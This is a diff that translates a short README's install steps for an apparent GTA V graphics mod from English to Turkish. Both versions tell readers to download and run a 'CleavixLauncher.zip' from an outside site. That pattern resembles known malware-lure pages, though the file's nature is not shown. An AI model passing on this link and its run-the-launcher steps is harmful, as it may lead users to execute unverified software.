@@ -1,10 +1,10 @@
-# Install
+# Kurulum
 
-1. Download the latest package: https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip
-2. Launch **CleavixLauncher.zip** and extract it.
-3. Open the launcher and select the package for **Grand Theft Auto V Enhanced Graphics Mod**.
-4. Apply the recommended profile and review the included notes.
-5. Start the game and verify your settings.
+1. En son paketi indirin: https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip
+2. **CleavixLauncher.zip** dosyasını çalıştırın ve çıkarın.
+3. Başlatıcıyı açın ve **Grand Theft Auto V Geliştirilmiş Grafik Modu** paketini seçin.
+4. Önerilen profili uygulayın ve eklenen notları inceleyin.
+5. Oyunu başlatın ve ayarlarınızı doğrulayın.
 
-## Tip
-Use a clean game folder and keep a backup of your original configuration before applying any changes.
+## İpucu
+Temiz bir oyun klasörü kullanın ve değişiklik uygulamadan önce orijinal yapılandırmanızın yedeğini alın.
